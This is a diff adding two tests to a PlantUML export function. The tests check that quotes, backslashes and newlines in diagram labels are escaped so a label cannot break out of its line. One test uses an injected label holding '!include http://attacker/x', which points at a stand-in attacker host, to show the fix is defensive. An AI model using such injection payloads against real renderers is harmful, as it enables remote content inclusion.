@@ -107,6 +107,22 @@ describe('toPlantUml', () => {
     expect(toPlantUml(m)).toContain('participant "The \\"Gateway\\"" as Gateway');
   });
 
+  it('escapes a backslash before a quote without letting it swallow the closing quote', () => {
+    // Escaping `"` before `\` would turn a label ending `\"` into `\\"` — read as an escaped
+    // backslash followed by a bare, string-closing quote, which breaks out of the declaration.
+    const raw = 'C:\\Users\\"Bob"';
+    const m = model({
+      participants: [{ id: 'P1', alias: 'A', label: raw, category: 'service', kind: 'participant', sourceNodeId: 'a' }],
+    });
+    const line = toPlantUml(m).split('\n').find((l) => l.startsWith('participant "'))!;
+    const match = line.match(/^participant "(.*)" as A$/);
+    expect(match).not.toBeNull();
+    // Decode the same way a real parser would — unescape `\"` before `\\` — and recover the
+    // original label. A wrong escape order corrupts this round-trip.
+    const decoded = match![1]!.replace(/\\"/g, '"').replace(/\\\\/g, '\\');
+    expect(decoded).toBe(raw);
+  });
+
   it("wraps a flow's messages in a native group <label> ... end block", () => {
     const m = model({
       participants: [
@@ -127,6 +143,29 @@ describe('toPlantUml', () => {
     expect(out).toContain('group Happy Path\n');
     expect(out).toContain('    A -> B: Go');
     expect(out.match(/^end$/m)).toHaveLength(1);
+  });
+
+  it('collapses a newline in a group label instead of letting it break out of the line', () => {
+    const m = model({
+      participants: [
+        { id: 'P1', alias: 'A', label: 'A', category: 'service', kind: 'participant', sourceNodeId: 'a' },
+        { id: 'P2', alias: 'B', label: 'B', category: 'service', kind: 'participant', sourceNodeId: 'b' },
+      ],
+      elements: [
+        {
+          kind: 'group',
+          id: 'f1',
+          label: 'Checkout\n!include http://attacker/x',
+          sourceFlowId: 'f1',
+          children: [{ kind: 'message', order: 0, from: 'P1', to: 'P2', label: 'Go', interaction: 'sync', sourceFlowId: 'f1', sourceEdgeIds: [], sourceStepIds: [] }],
+        },
+      ],
+    });
+    const out = toPlantUml(m);
+    // The whole label stays on the `group` line — the embedded newline is collapsed to a space,
+    // so `!include ...` can never appear as its own line and be read as a separate statement.
+    expect(out).toContain('group Checkout !include http://attacker/x\n');
+    expect(out).not.toMatch(/\n!include/);
   });
 
   it('emits two separate group blocks for two flows, never merging them', () => {
